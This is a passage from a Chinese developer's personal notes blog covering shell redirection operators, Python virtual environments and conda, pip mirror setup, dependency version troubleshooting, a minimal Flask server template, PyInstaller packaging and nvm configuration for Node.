class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bashCopy code</span><br><span class="line"><span class="built_in">command</span> &gt;&gt; output.txt</span><br></pre></td></tr></table></figure></li><li><p><strong><code>2&gt;</code></strong>: 将标准错误重定向到文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bashCopy code</span><br><span class="line"><span class="built_in">command</span> 2&gt; error.txt</span><br></pre></td></tr></table></figure></li><li><p><strong><code>2&gt;&gt;</code></strong>: 将标准错误追加到文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bashCopy code</span><br><span class="line"><span class="built_in">command</span> 2&gt;&gt; error.txt</span><br></pre></td></tr></table></figure></li><li><p><strong><code>&amp;&gt;</code> 或 &gt;&amp;`</strong>: 将标准输出和标准错误都重定向到文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bashCopy codecommand &amp;&gt; output_and_error.txt</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">command</span> &gt;&amp; output_and_error.txt</span><br></pre></td></tr></table></figure></li><li><p><strong><code>&lt;</code></strong>: 从文件中读取内容作为标准输入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bashCopy code</span><br><span class="line"><span class="built_in">command</span> &lt; input.txt</span><br></pre></td></tr></table></figure></li><li><p><strong><code>|</code></strong>: 将一个命令的输出作为另一个命令的输入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bashCopy code</span><br><span class="line">command1 | command2</span><br></pre></td></tr></table></figure></li><li><p><strong><code>tee</code></strong>: 将输出同时发送到屏幕和文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bashCopy code</span><br><span class="line"><span class="built_in">command</span> | tee output.txt</span><br></pre></td></tr></table></figure></li><li><p><strong><code>&amp;</code></strong>: 将命令放入后台执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bashCopy code</span><br><span class="line"><span class="built_in">command</span> &amp;</span><br></pre></td></tr></table></figure></li></ol><p>这些操作符和语法的组合可以实现各种输入输出的控制和处理需求。可以根据具体的情况选择适当的操作符和语法。</p><p>这些重定向和管道操作符是由Shell解释器解析的，然后转化为对Linux系统内核的系统调用，在底层，这些系统调用通常是用C语言编写的，因为Linux内核本身主要是用C编写的。这涉及到文件描述符的操作、进程控制、管道通信等底层操作。当Shell执行命令时，它会创建子进程，并使用<code>fork</code>、<code>exec</code>等系统调用来执行指定的命令，同时通过<code>dup2</code>等调用来设置文件描述符的映射，从而实现重定向</p><h3 id="venv"><a href="#venv" class="headerlink" title="venv"></a>venv</h3><h4 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h4><ol><li>在服务器上创建一个虚拟环境，不要继承全局包库，只基于解释器创建全新空环境</li><li>激活虚拟环境.venv\Scripts\activate.bat</li></ol><h4 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h4><h5 id="配置多版本python解释器"><a href="#配置多版本python解释器" class="headerlink" title="配置多版本python解释器"></a>配置多版本python解释器</h5><ol><li><p>直接创建py文件</p></li><li><p>结合conda切换为当前python版本，也可以调整环境变量通过完整版本名称来触发，pip天然考虑到了多环境问题，无需重命名</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207151104502.png" alt="image-20241207151104502"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207151200755.png" alt="image-20241207151200755"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207151331144.png" alt="image-20241207151331144"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207151459973.png" alt="image-20241207151459973"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207151538446.png" alt="image-20241207151538446"></p></li></ol><h5 id="配置python虚拟环境"><a href="#配置python虚拟环境" class="headerlink" title="配置python虚拟环境"></a>配置python虚拟环境</h5><ol><li><p>控制台终端python -m venv myvenv，虚拟环境py版本取决于当前的python命令的python解释器版本</p></li><li><p>.\myvenv\Scripts\activate 激活后前面出现(myvenv)</p></li><li><p>deactive，可以激活另外一个venv</p></li><li><p>让vscode自动识别虚拟环境，左下角设置，右上角打开json文件，在json中配置如下</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207145456465.png" alt="image-20241207145456465"></p><p><img src="%E5%9F%BA%E4%BA%8EYOLO5%E7%9A%84%E6%99%BA%E6%85%A7%E5%A4%A7%E6%A3%9A%E7%B3%BB%E7%BB%9F.assets/image-20241207145512762.png" alt="image-20241207145512762"></p></li></ol><p>也可以vscode右下角选择python解释器和虚拟环境（因此可以创建envs用于集中管理多个venv）</p><h5 id="设置默认终端从ps到cmd"><a href="#设置默认终端从ps到cmd" class="headerlink" title="设置默认终端从ps到cmd"></a><strong>设置默认终端从ps到cmd</strong></h5><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207151626929.png" alt="image-20241207151626929"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207151650424.png" alt="image-20241207151650424"></p><h5 id="设置字体大小ctrl-滚轮调节"><a href="#设置字体大小ctrl-滚轮调节" class="headerlink" title="设置字体大小ctrl+滚轮调节"></a>设置字体大小ctrl+滚轮调节</h5><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207151933993.png" alt="image-20241207151933993"></p><h5 id="配置自动补全括号"><a href="#配置自动补全括号" class="headerlink" title="配置自动补全括号"></a>配置自动补全括号</h5><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207152052024.png" alt="image-20241207152052024"></p><h5 id="自动补全插件"><a href="#自动补全插件" class="headerlink" title="自动补全插件"></a>自动补全插件</h5><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207152149780.png" alt="image-20241207152149780"></p><h5 id="vscode-python-插件推荐"><a href="#vscode-python-插件推荐" class="headerlink" title="vscode-python-插件推荐"></a>vscode-python-插件推荐</h5><p><a href="https://www.bilibili.com/video/BV1zU4y177ML">https://www.bilibili.com/video/BV1zU4y177ML</a></p><ol><li>Python Extension Pack </li><li>Live Code for Python 实时展示每一个变量值，识别print并自动打印 </li><li>Python Preview 实时可视化代码，切换vs code皮肤 </li><li>sort lines 按字母大小排序，将所有文本打乱顺序 </li><li>git graph 看到当前分支的commit记录和变化 </li><li>python snippets 提供示例代码作参考 </li><li>better comments 注释，根据关键词用不同的颜色高亮代码片段 </li><li>python docstring generator 自动生成函数的注释格式，通过tab键快速切换填充块编写相应的注释</li></ol><h4 id="conda"><a href="#conda" class="headerlink" title="conda"></a>conda</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pip install conda</span><br><span class="line"><span class="comment"># 如果没有pip，按以下</span></span><br><span class="line">wget https://repo.anaconda.com/archive/Anaconda3-2023.07-1-Linux-x86_64.sh <span class="comment">#或者</span></span><br><span class="line">curl -O https://repo.anaconda.com/archive/Anaconda3-2023.07-1-Linux-x86_64.sh</span><br><span class="line">chmod +x Anaconda3-2023.07-1-Linux-x86_64.sh</span><br><span class="line">./Anaconda3-2023.07-1-Linux-x86_64.sh</span><br><span class="line"><span class="comment"># 如果安装的最后一步没有激活conda环境变量，更改bashrc之后重新连接shell即可</span></span><br><span class="line">nano ~/.bashrc</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/root/anaconda3/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">PS1=<span class="string">&quot;\[\e[1;34m\][\[\e[1;32m\]\u@\h \[\e[1;35m\]\t \[\e[1;33m\]\w\[\e[1;34m\]]\[\e[1;34m\]#\[\e[0m\] &quot;</span>  <span class="comment">#颜色</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">conda init bash <span class="comment"># 然后关闭重启终端</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用指定python，conda安装好后自带一个python3，使用conda info 查看</span></span><br><span class="line">conda create -n your_env_name python=x.x</span><br><span class="line"><span class="built_in">source</span> activate your_env_name <span class="comment">#对于conda4.3及之前的版本需要source</span></span><br><span class="line"><span class="built_in">source</span> deactivate</span><br><span class="line">conda remove -n your_env_name --all</span><br><span class="line"></span><br><span class="line">conda create -n venv</span><br><span class="line">conda create -n myenv python=3.10 <span class="comment">#使用conda下载并安装指定python版本</span></span><br><span class="line">conda activate venv</span><br><span class="line">python --version</span><br><span class="line"><span class="built_in">which</span> python/pip</span><br><span class="line"></span><br><span class="line">pip list</span><br><span class="line">pip show 包名 <span class="comment">#查看安装的库路径</span></span><br><span class="line">~/anaconda3/envs/虚拟环境名/lib/python版本/site-packages/ <span class="comment">#安装库的路径</span></span><br><span class="line"></span><br><span class="line">conda list python</span><br><span class="line">conda info</span><br><span class="line">conda info --envs</span><br><span class="line">conda activate venv</span><br><span class="line">conda deactivate</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openjdk-8-jdk <span class="comment">#安装java指定版本</span></span><br><span class="line">sed -i <span class="string">&#x27;s/A/B/g&#x27;</span> /path/to/directory/* <span class="comment">#查找指定目录下所有文件中的A字符串并换成B字符串</span></span><br><span class="line">grep -rl <span class="string">&quot;A&quot;</span> /path/to/directory/ <span class="comment"># 将指定目录下的所有文件中包含A字符串的位置都输出</span></span><br></pre></td></tr></table></figure><blockquote><p>ubuntu22.04<br>conda 23.3.1<br>Python-3.8.19<br>java -version openjdk version “1.8.0_402”<br>OpenJDK Runtime Environment (build 1.8.0_402-8u402-ga-2ubuntu1~22.04-b06)<br>OpenJDK 64-Bit Server VM (build 25.402-b06, mixed mode)</p></blockquote><h3 id="pip-install"><a href="#pip-install" class="headerlink" title="pip install"></a>pip install</h3><h4 id="镜像源"><a href="#镜像源" class="headerlink" title="镜像源"></a>镜像源</h4><p><a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></p><p><a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a></p><p><a href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a></p><p><a href="https://mirrors.cloud.tencent.com/pypi/simple/">https://mirrors.cloud.tencent.com/pypi/simple/</a></p><p><a href="https://mirrors.bfsu.edu.cn/pypi/web/simple/">https://mirrors.bfsu.edu.cn/pypi/web/simple/</a></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207145826043.png" alt="image-20241207145826043"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207145920001.png" alt="image-20241207145920001"></p><p>有时候以上厂商链接地址证书过期就临时用别的，等着他们会替换好的，此时如果出问题参照以下命令永久换源<img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20241207150012470.png" alt="image-20241207150012470"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip config set global.index-url https://mirrors.aliyun.com/pypi/simple</span><br><span class="line">pip config set install.trusted-host mirrors.aliyun.com</span><br><span class="line"><span class="comment"># pip config set global.extra-index-url https://mirrors.aliyun.com/pypi/simple/</span></span><br><span class="line"><span class="comment">#Writing to C:\Users\18362\AppData\Roaming\pip\pip.ini,会结合user/pip/pip.ini，extra-index-url只会有一个</span></span><br><span class="line"></span><br><span class="line">pip config set global.index-url http://pypi.douban.com/simple/</span><br><span class="line">pip config set install.trusted-host pypi.douban.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以手动下载包，包括wheel，放到project下使用pip install 包名.whl 进行手动安装</p><p>手动下载whl文件：<a href="https://pypi.org搜包名,然后download找对应版本/">https://pypi.org搜包名，然后download找对应版本</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip debug --verbose #看到compatible tags后面的就是支持的版本，随便对应一个即可。如果不对应会安装报错</span><br></pre></td></tr></table></figure><h4 id="安装路径"><a href="#安装路径" class="headerlink" title="安装路径"></a>安装路径</h4><p>一般情况下使用的pip都是当前venv环境下的pip，可以使用<code>pip -V</code>查看pip本身的路径，如果在pycharm中没找到pip安装的包，使用<strong>pip show pkgname</strong>来查看，比如<code>pip show flask</code> ，如果确实路径在当前项目下的venv中，而且文件资源管理器看到确实有的话，那重启pycharm就好了。</p><h4 id="requirements"><a href="#requirements" class="headerlink" title="requirements"></a>requirements</h4><p><code>pip install -r requirements.txt  -i https://pypi.tuna.tsinghua.edu.cn/simple/</code></p><p><code>pip freeze &gt; requirements.txt</code> 命令将项目的<strong>库依赖导出</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app = Flask(__name__)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 配置SQLite数据库文件路径</span></span><br><span class="line"><span class="comment"># DATABASE = &#x27;sa.db&#x27;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 连接SQLite数据库</span></span><br><span class="line"><span class="comment"># def get_db():</span></span><br><span class="line"><span class="comment">#     db = sqlite3.connect(DATABASE)</span></span><br><span class="line"><span class="comment">#     db.row_factory = sqlite3.Row</span></span><br><span class="line"><span class="comment">#     return db</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 关闭数据库连接</span></span><br><span class="line"><span class="comment"># def close_db(db):</span></span><br><span class="line"><span class="comment">#     db.close()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取传感器数据,传感器数据列表界面</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/api/sensor/list&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment"># def get_sensors_datalist():</span></span><br><span class="line"><span class="comment">#     # 查询传感器数据，获取传感器对象</span></span><br><span class="line"><span class="comment">#     SensorsInfo = db.session.query(Sensor).all()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     # 封装传感器数据为JSON格式</span></span><br><span class="line"><span class="comment">#     data = []</span></span><br><span class="line"><span class="comment">#     for sensor in SensorsInfo:</span></span><br><span class="line"><span class="comment">#         data.append(&#123;</span></span><br><span class="line"><span class="comment">#             &#x27;id&#x27;: sensor.id,</span></span><br><span class="line"><span class="comment">#             &#x27;name&#x27;: sensor.name,</span></span><br><span class="line"><span class="comment">#             &#x27;position&#x27;: sensor.position</span></span><br><span class="line"><span class="comment">#         &#125;)</span></span><br><span class="line"><span class="comment">#     return jsonify(data)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="依赖包版本问题"><a href="#依赖包版本问题" class="headerlink" title="依赖包版本问题"></a>依赖包版本问题</h4><p>pipdeptree可以查看依赖关系</p><p>**:one: pip install –only-binary :all: pillow **</p><p><strong>:two: pip install –only-binary :all: pillow==8.4.0</strong> 可以直接寻找最新版的二进制wheel文件来安装</p><p>还是不行就安装vs，微软官方下载地址：<a href="https://visualstudio.microsoft.com/zh-hans/vs/older-downloads/%EF%BC%8C%E5%8F%82%E8%80%83https://blog.csdn.net/qq_44712946/article/details/131820011">https://visualstudio.microsoft.com/zh-hans/vs/older-downloads/，参考https://blog.csdn.net/qq_44712946/article/details/131820011</a>  <a href="https://blog.csdn.net/weixin_42033112/article/details/133427964">https://blog.csdn.net/weixin_42033112/article/details/133427964</a></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/e2e653f9a70c43cc9f38d236eaf69add.png" alt="img"></p><p>添加cmake和MSVC环境变量路径</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/69fd15d8f9284db2a910211e9c8bca28.png" alt="img"></p><h4 id="pycharm缓存问题"><a href="#pycharm缓存问题" class="headerlink" title="pycharm缓存问题"></a>pycharm缓存问题</h4><p>我pycharm终端前面已经有了(venv),而且解释器用的也是venv中的，我pip安装包已经安装到了venv中，但是为什么pycharm仍然提示我安装requirements里的包？而且我在setting中也没看到在venv中已经安装好的包？</p><p>解决方法：file—&gt;invalidate caches /restart</p><p>若无效</p><p>删除venv，重新配置venv，注意需要关闭terminal窗口，重新打开后再pip install</p><h4 id="python版本与位数"><a href="#python版本与位数" class="headerlink" title="python版本与位数"></a>python版本与位数</h4><p>问题背景</p><p>pycharm使用python3.8安装requirements.txt时候发现torch1.7.0安装不上，IDEA提示找不到合适该平台的包。根据百度<a href="https://download.pytorch.org/whl/torch/%E6%8E%92%E9%99%A4%E4%BA%86%E7%BD%91%E7%BB%9C%E7%AD%89%E9%97%AE%E9%A2%98%EF%BC%8C%E4%BA%B2%E8%87%AA%E6%89%93%E5%BC%80%E5%AE%98%E6%96%B9%E5%AE%89%E8%A3%85%E5%9C%B0%E5%9D%80https://download.pytorch.org/whl/torch/">https://download.pytorch.org/whl/torch/排除了网络等问题，亲自打开官方安装地址https://download.pytorch.org/whl/torch/</a> 发现确实有这个轮子，而且本身电脑确实是win64的，用的也是python3.8版本。</p><p>最后顺着verbose提示发现怎么出现了win32？ 后来查看python3.8是以前安装的32位，所以这里torch包安不上也和python的位数有关。如果还是找不到原因，都打算用手动下载安装来尝试了。另外，在使用python3.8x64安装的时候不能覆盖安装，必须先卸载原来的再安装，否则只能用安装器来repaire，控制面板中卸载会报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip debug --verbose <span class="comment">#查看当前python解释器最匹配的库包版本，用于下载win_amd64，参考https://zhuanlan.zhihu.com/p/413640389 也可以查看pip版本，配置，环境以及支持的标签</span></span><br><span class="line">python -c <span class="string">&quot;import platform; print(platform.architecture())&quot;</span></span><br><span class="line">(<span class="string">&#x27;32bit&#x27;</span>, <span class="string">&#x27;WindowsPE&#x27;</span>) <span class="comment">#查看python解释器的版本</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(venv) <span class="built_in">PS</span> B:\web<span class="literal">-project</span>\runproject&gt; python</span><br><span class="line">Python <span class="number">3.8</span>.<span class="number">10</span> (tags/v3.<span class="number">8.10</span>:<span class="number">3</span>d8993a, May  <span class="number">3</span> <span class="number">2021</span>, <span class="number">11</span>:<span class="number">34</span>:<span class="number">34</span>) [<span class="type">MSC</span> <span class="type">v.1928</span> <span class="number">64</span> <span class="type">bit</span> (<span class="built_in">Int</span><span class="type">el</span>)] on win32 </span><br><span class="line"><span class="built_in">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="comment">#Python是64位的，它是用Microsoft Visual C++ 1928编译器编译的。on win32表示Python运行在&quot;win32平台&quot;上，这是Windows的通用名称，不区分32位和64位</span></span><br></pre></td></tr></table></figure><h4 id="pytorch"><a href="#pytorch" class="headerlink" title="pytorch"></a>pytorch</h4><p>PyTorch官网上说明目前pytorch在Windows上只支持3.8-3.11</p><p><a href="https://pytorch.org/get-started/locally/">Start Locally | PyTorch</a> 官网根据本机配置下载torch包，pytorch属于torch一个分支。</p><p>本机nvidia-smi查看cuda版本，cuda没安装的去nvidia官网找对应显卡型号驱动进行安装</p><p>pip有时候不能直接下载pytorch生成的链接，原因不明，手动下载放到包位置，参考<a href="https://blog.csdn.net/congcong_i/article/details/116723092">https://blog.csdn.net/congcong_i/article/details/116723092</a> </p><p>torch和torchvision是两个Python包，版本之间需要满足对应关系，参考下图。torch提供了基本的数据处理、模型搭建、训练、测试等功能，而torchvision专注于计算机视觉领域，提供了一些预训练的模型、数据集、图像变换等工具。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240109175603755.png" alt="image-20240109175603755"></p><h3 id="flask2-1-1"><a href="#flask2-1-1" class="headerlink" title="flask2.1.1"></a>flask2.1.1</h3><h4 id="版本兼容问题"><a href="#版本兼容问题" class="headerlink" title="版本兼容问题"></a>版本兼容问题</h4><p>查看当前虚拟环境中python版本<code>python --version</code></p><p>flask版本和python版本最好满足匹配关系，常用flask2.1.1+python3.7-3.9，减少不必要的麻烦</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240104163458664.png" alt="image-20240104163458664"></p><h4 id="一个server-py模板"><a href="#一个server-py模板" class="headerlink" title="一个server.py模板"></a>一个server.py模板</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> uploads <span class="keyword">import</span> * <span class="comment"># 前端上传的文件放在uploads文件夹中</span></span><br><span class="line"><span class="keyword">from</span> Output.output <span class="keyword">import</span> output <span class="comment"># 导入与该模板main.py同级目录下Output文件夹output.py中的output函数</span></span><br><span class="line"><span class="comment"># from flask import request</span></span><br><span class="line"><span class="comment"># from flask_sqlalchemy import SQLAlchemy</span></span><br><span class="line"></span><br><span class="line">LISTEN_HOST = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">LISTEN_PORT = <span class="number">5431</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始第一个接口</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment">#这里可以写一些服务器除了运行falsk以外要做的其他事情，比如active_data()，一个在后台通过ws来不断传递随机生成传感器数据的模块</span></span><br><span class="line">    app.run(host=LISTEN_HOST, port=LISTEN_PORT, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行时在from flask import Flask时报错<code>ImportError: cannot import name &#39;url_quote&#39; from &#39;werkzeug.urls&#39;</code> ，看起来是包版本的冲突了。</p><blockquote><p> 看看bing怎么说：</p><p><a href="https://stackoverflow.com/questions/77213053/why-did-flask-start-failing-with-importerror-cannot-import-name-url-quote-fr">这个错误的原因可能是你的Werkzeug版本过高，导致Flask无法正确地导入url_quote函数。url_quote是Werkzeug 1.0.0版本中新增的函数，但是在Werkzeug 3.0.0版本中被移除了</a><a href="https://stackoverflow.com/questions/77213053/why-did-flask-start-failing-with-importerror-cannot-import-name-url-quote-fr">1</a><a href="https://stackoverflow.com/questions/77452472/cannot-import-name-url-quote-from-werkzeug-urls">。Flask 2.1.1版本依赖于Werkzeug 2.2.0版本，如果你的Werkzeug版本高于2.2.0，就会出现这个错误</a><a href="https://stackoverflow.com/questions/77452472/cannot-import-name-url-quote-from-werkzeug-urls">2</a>。要解决这个错误，你可以尝试以下方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Werkzeug==<span class="number">2.2</span><span class="number">.0</span></span><br></pre></td></tr></table></figure></blockquote><h4 id="访问hello-api"><a href="#访问hello-api" class="headerlink" title="访问hello_api"></a>访问hello_api</h4><p>处理好项目中的包依赖问题后，按照以上模板内容，根据运行日志提示访问以下地址指定路径即可！</p><p><a href="http://127.0.0.1:5431/api">http://127.0.0.1:5431/api</a></p><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload # 非重启重载</span><br></pre></td></tr></table></figure><h3 id="打包成exe"><a href="#打包成exe" class="headerlink" title="打包成exe"></a>打包成exe</h3><p>pip install pyinstaller</p><p>进入要打包的项目内</p><p>处理路径问题</p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取exe文件所在的目录,将项目路径转为打包完之后的exe路径</span></span><br><span class="line">current_path = os.path.dirname (sys.executable)</span><br></pre></td></tr></table></figure></blockquote><p>pyinstaller –onefile main.py</p><p>pyinstaller –onefile –windowed –icon=my_icon.ico your_script.py 自定义打包的exe图标，ico放到main.py相同目录下，也可以更改快捷方式图标的方式</p><p>到dist目录下找main.exe</p><h3 id="pycharm几个快捷键"><a href="#pycharm几个快捷键" class="headerlink" title="pycharm几个快捷键"></a>pycharm几个快捷键</h3><p>ctrl+shift+R 批量查找替换/区别于：ctrl+shift+F win11切换中文简体繁体</p><h3 id="部署在docker"><a href="#部署在docker" class="headerlink" title="部署在docker"></a>部署在docker</h3><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><h3 id="node版本"><a href="#node版本" class="headerlink" title="node版本"></a>node版本</h3><p>nvm配置</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root: A:\nvm</span><br><span class="line">path: A:\nvm_nodejs</span><br><span class="line">node_mirror: http://mirrors.cloud.tencent.com/nodejs-release/</span><br><span class="line">npm_mirror: http://mirrors.cloud.tencent.com/npm/</span><br><span class="line">证书失效时替换淘宝/腾讯</span><br><span class="line">node_mirror: https://npm.taobao.org/mirrors/node/ </span><br><span class="line">npm_mirror: https://npm.taobao.org/mirrors/npm/</span><br></pre></td></tr></table></figure><p>进入项目目录，打开powershell</p><p>nvm list (available)</p><p>nvm use/install/version</p><p>如果版本太老，去镜像源下载比如<a href="http://mirrors.cloud.tencent.com/nodejs-release/v8.9.4/">http://mirrors.cloud.tencent.com/nodejs-release/v8.9.4/</a> 指定老版本的nodejs.msi手动安装到nvm文件夹下，可以删除环境变量中自动添加的nodejs老版本这个path下的环境变量。</p><p>nvm use 指定版本</p><p>npm install 安装项目文件夹下package.json，有的库安装不上报错vs c++编译失败，问bing换版本</p><p>npm run dev 运行项目，上脚手架，本地预览</p><h3 id="单装某依赖node-sass为例"><a href="#单装某依赖node-sass为例" class="headerlink" 